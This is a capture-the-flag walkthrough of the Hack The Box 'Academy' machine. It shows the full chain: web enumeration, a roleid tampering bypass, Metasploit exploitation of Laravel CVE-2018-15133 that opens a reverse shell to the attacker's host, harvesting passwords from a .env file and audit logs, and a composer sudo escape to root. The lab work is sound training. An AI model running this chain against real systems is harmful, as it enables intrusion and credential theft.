---
layout: post
title: "[HTB] Academy"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/Academy_img/img1.png)

- OS: Linux
- Release Date: 07 Nov 2020
- Difficulty: Easy

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 17:47 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.038s latency).
Not shown: 60503 closed tcp ports (reset), 5029 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

Scripts and versions.
```
❯ nmap -p22,80,33060 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 17:48 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.041s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

Adding `academy.htb` to our hosts file.
```
❯ echo "$target academy.htb" | sudo tee -a /etc/hosts
10.129.xx.xx academy.htb
```

## TCP 80: HTTP
![](/img/htb_img/Academy_img/img2.png)

Seems like a official landing page for Hack the box Academy. We can login or register a new account.
After registering an account we get welcomed to the academy dashboard.
![](/img/htb_img/Academy_img/img3.png)

I registered the user as `User`, but seems like any account gets logged in as `egre55`.

### Web Fuzzing
Using the `quickhits` dictionary we can get some interesting results with gobuster (or similar):
```
❯ gobuster dir -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://academy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
<...>
/.htusers             (Status: 403) [Size: 276]
/admin.php            (Status: 200) [Size: 2633]
/config.php           (Status: 200) [Size: 0]
/index.phps           (Status: 403) [Size: 276]
/login.php            (Status: 200) [Size: 2627]
/register.php         (Status: 200) [Size: 3003]
/server-status/       (Status: 403) [Size: 276]
Progress: 2565 / 2565 (100.00%)
===============================================================
Finished
===============================================================
```

So, there is an endpoint at `/admin.php`. I can't log in with any account.

### Catching the register request
If we catch the register user's request with burpsuite we can see the following:
```
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 47
Cache-Control: max-age=0
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=mk7l7rc42qssa7l2ns777o4h04
Connection: keep-alive

uid=User2&password=User2&confirm=User2&roleid=0
```

If we change the `roleid` to 1 maybe we are considered admin in the server backend.
Let's change it and then try logging to `/admin.php`.

![](/img/htb_img/Academy_img/img4.png)

We succesfully logged in. We can see a new domain: `dev-staging-01.academy.htb`. Let's add it to our hosts file and then check it out.

# Foothold
![](/img/htb_img/Academy_img/img5.png)

We get welcomed with a debugging webpage with a 500 error. The log naming suggests this is running a Laravel PHP framework.

## Laravel CVE-2018-15133
There is a vulnerability in this framework in which if we have the APP_KEY we can get a reverse shell (CVE-2018-15133).

Looking at the `Environment & details` part of the debugging page we can see the following:
![](/img/htb_img/Academy_img/img6.png)

So, we have the `APP_KEY`: `base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=`.

### Metasploit
```
msf > search laravel

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank       Check  Description
   -  ----                                                       ---------------  ----       -----  -----------
   0  exploit/linux/http/invoiceninja_unauth_rce_cve_2024_55555  2024-12-13       excellent  Yes    Invoice Ninja unauthenticated PHP Deserialization Vulnerability
   1    \_ target: PHP                                           .                .          .      .
   2    \_ target: Unix/Linux Command                            .                .          .      .
   3  exploit/linux/http/invoiceshelf_unauth_rce_cve_2024_55556  2024-12-13       excellent  Yes    InvoiceShelf unauthenticated PHP Deserialization Vulnerability
   4    \_ target: PHP                                           .                .          .      .
   5    \_ target: Unix/Linux Command                            .                .          .      .
   6  exploit/unix/http/laravel_token_unserialize_exec           2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
   7  exploit/multi/php/ignition_laravel_debug_rce               2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition
   8    \_ target: Unix (In-Memory)                              .                .          .      .
   9    \_ target: Windows (In-Memory)                           .                .          .      .


Interact with a module by name or index. For example info 9, use 9 or use exploit/multi/php/ignition_laravel_debug_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Windows (In-Memory)'

msf > use 6
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(unix/http/laravel_token_unserialize_exec) >
```

Setting up the metasploit exploit:
```
msf exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS 10.129.xx.xx
RHOSTS => 10.129.xx.xx
msf exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
msf exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0
LHOST => 10.10.xx.xx
msf exploit(unix/http/laravel_token_unserialize_exec) > set LPORT 4444
LPORT => 4444
msf exploit(unix/http/laravel_token_unserialize_exec) > run
[*] Started reverse TCP handler on 10.10.xx.xx:4444 
[*] Command shell session 1 opened (10.10.xx.xx:4444 -> 10.129.xx.xx:53058) at 2025-11-17 18:22:40 +0100

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

whoami
www-data
```

It works, even if we don't have a normal shell we can execute some commands. I can spawn a shell with bash scripting:
```
script /dev/null -c bash

Script started, file is /dev/null
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

Let's check the home for users and the flag.
```
www-data@academy:/home$ ls
ls
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
www-data@academy:/home$ ls -lR
ls -lR
.:
total 24
drwxr-xr-x 2 21y4d    21y4d    4096 Aug 10  2020 21y4d
drwxr-xr-x 2 ch4p     ch4p     4096 Aug 10  2020 ch4p
drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12  2020 cry0l1t3
drwxr-xr-x 3 egre55   egre55   4096 Aug 10  2020 egre55
drwxr-xr-x 2 g0blin   g0blin   4096 Aug 10  2020 g0blin
drwxr-xr-x 5 mrb3n    mrb3n    4096 Aug 12  2020 mrb3n

./21y4d:
total 0

./ch4p:
total 0

./cry0l1t3:
total 4
-r--r----- 1 cry0l1t3 cry0l1t3 33 Nov 17 16:31 user.txt

./egre55:
total 0

./g0blin:
total 0

./mrb3n:
total 0
www-data@academy:/home$
```

As we can see, the flag is in `cry0l1t3`'s home folder, but we have no right to read it as `www-data`.

# Lateral Movement
Looking at the academy directory we can see a `.env`:
```
www-data@academy:/var/www/html/academy$ ls -lah
ls -lah
total 280K
drwxr-xr-x 12 www-data www-data 4.0K Aug 13  2020 .
drwxr-xr-x  4 root     root     4.0K Aug 13  2020 ..
-rw-r--r--  1 www-data www-data  706 Aug 13  2020 .env
-rw-r--r--  1 www-data www-data  651 Feb  7  2018 .env.example
-rw-r--r--  1 www-data www-data  111 Feb  7  2018 .gitattributes
-rw-r--r--  1 www-data www-data  155 Feb  7  2018 .gitignore
drwxr-xr-x  6 www-data www-data 4.0K Feb  7  2018 app
-rwxr-xr-x  1 www-data www-data 1.7K Feb  7  2018 artisan
drwxr-xr-x  3 www-data www-data 4.0K Feb  7  2018 bootstrap
-rw-r--r--  1 www-data www-data 1.5K Feb  7  2018 composer.json
-rw-r--r--  1 www-data www-data 188K Aug  9  2020 composer.lock
drwxr-xr-x  2 www-data www-data 4.0K Feb  7  2018 config
drwxr-xr-x  5 www-data www-data 4.0K Feb  7  2018 database
-rw-r--r--  1 www-data www-data 1.2K Feb  7  2018 package.json
-rw-r--r--  1 www-data www-data 1.1K Feb  7  2018 phpunit.xml
drwxr-xr-x  4 www-data www-data 4.0K Nov  9  2020 public
-rw-r--r--  1 www-data www-data 3.6K Feb  7  2018 readme.md
drwxr-xr-x  5 www-data www-data 4.0K Feb  7  2018 resources
drwxr-xr-x  2 www-data www-data 4.0K Feb  7  2018 routes
-rw-r--r--  1 www-data www-data  563 Feb  7  2018 server.php
drwxr-xr-x  5 www-data www-data 4.0K Feb  7  2018 storage
drwxr-xr-x  4 www-data www-data 4.0K Feb  7  2018 tests
drwxr-xr-x 38 www-data www-data 4.0K Aug  9  2020 vendor
-rw-r--r--  1 www-data www-data  549 Feb  7  2018 webpack.mix.js
```

We can read it:
```
www-data@academy:/var/www/html/academy$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

We got a password: `mySup3rP4s5w0rd!!`.

## Cry0l1t3
```
www-data@academy:/var/www/html/academy$ su cry0l1t3
su cry0l1t3
Password: mySup3rP4s5w0rd!!

$ whoami
whoami
cry0l1t3
$ bash               
bash
cry0l1t3@academy:/var/www/html/academy$
```

### User flag
```
cry0l1t3@academy:~$ cat user.txt
cat user.txt
<REDACTED>
cry0l1t3@academy:~$
```

## Enumeration as Cry0l1t3
We can see the groups of this user:
```
cry0l1t3@academy:~$ id
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

As we can see, we are from the `adm` group.

Going a bit back we can see that the laravel exploit was found because of a logging policy. Checking all the logs I found out a tool called `aureport`, which has an option to show the passwords in plain text on the logging part.

Let's run it and check if there is something there:
```
aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
6. 08/12/2020 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/2020 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
8. 08/12/2020 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
9. 08/12/2020 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/2020 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/2020 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/2020 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/2020 02:33:36 109 0 ? 1 sh "exit",<nl>
cry0l1t3@academy:~$
```

As we can see, we have the password of `mrb3n` on the second entry of the tool.
`mrb3n`:`mrb3n_Ac@d3my!`

## mrb3n
```
cry0l1t3@academy:~$ su mrb3n
su mrb3n
Password: mrb3n_Ac@d3my!

$ id
id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
$ sudo -l
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
$ 
```

We are `mrb3n` now, and we can run `composer` as sudo.

# Privilege Escalation
This privesc is pretty easy because `composer` has a page in `GTFOBins`:
https://gtfobins.github.io/gtfobins/composer/?ref=secjuice#sudo

Basically we need to do the following:
```
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

So, let's exploit it:
```
mrb3n@academy:~$ TF=$(mktemp -d)

TF=$(mktemp -d)
mrb3n@academy:~$ 
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
<":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
id
uid=0(root) gid=0(root) groups=0(root)
#
```

### Root flag
```
# cat /root/root.txt
cat /root/root.txt
<REDACTED>
```